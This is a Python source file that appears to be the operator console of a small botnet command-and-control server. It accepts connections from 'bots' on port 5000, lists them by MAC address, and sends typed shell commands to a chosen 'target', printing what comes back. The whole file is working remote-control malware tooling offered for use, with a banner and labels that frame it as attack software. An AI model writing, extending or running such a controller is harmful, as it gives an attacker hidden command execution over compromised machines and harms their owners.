import socket
import threading
import json

conn_list={}
def server():
    global conn_list
    HOST = ''                 # Symbolic name meaning all available interfaces
    PORT = 5000            # Arbitrary non-privileged port
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        mac=""
        if conn:

            mac=conn.recv(4098).decode('utf-8')
            if mac:
                if mac in conn_list:
                    print(bcolors.OKGREEN,"\n[*] Bot Online:{}".format(mac))
                else:
                    print(bcolors.OKBLUE,"\n[+] Bot Added:{}".format(mac))
                    conn_list[mac]=conn


def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}".format(count,key))

    else:
        print(bcolors.FAIL,"\nList is empty")



def trigger():
    global conn_list
    interaction=int(input("Whom you wanna interact with:-"))
    if interaction:
        if conn_list:
            if interaction<=len(conn_list):
                #print(conn_list)
                console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
        else:
            print(bcolors.FAIL,"\nNo connections")

def console(conn,bot,socket_target):
    print("\n====Target::({})====".format(bot))

    while True:
        commands=input("cmd>")
        a={bot:commands}
        if commands=='exit':
            return 0
        else:
            commands=json.dumps(a)
            commands = bytes(commands, 'utf-8')
            conn.sendall(commands)
            out=conn.recv(64000).decode('utf-8')
            if out=="Dead":
                print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
                del conn_list[socket_target]
                return 0
            else:
                print(out)



def banner():
    print("===Ignite the light master and change this filthy reality===")

def main():
    banner()
    threading.Thread(target=server).start()
    print(bcolors.ENDC,"[+] Server Started")
    print("Type help or ? for options")
    while True:
        print(bcolors.ENDC)
        choice=input(">")
        if choice=='bots' or choice =='b':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice =='interact' or choice =='i':
            p=threading.Thread(target=trigger)
            p.start()
            p.join()
        elif choice =='help' or choice =='?':
            print(bcolors.HEADER,"\n==========\nbots or b :To check for available bots online\ninteract or i :To interact with a target\n==========")
        else:
            pass


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

main()
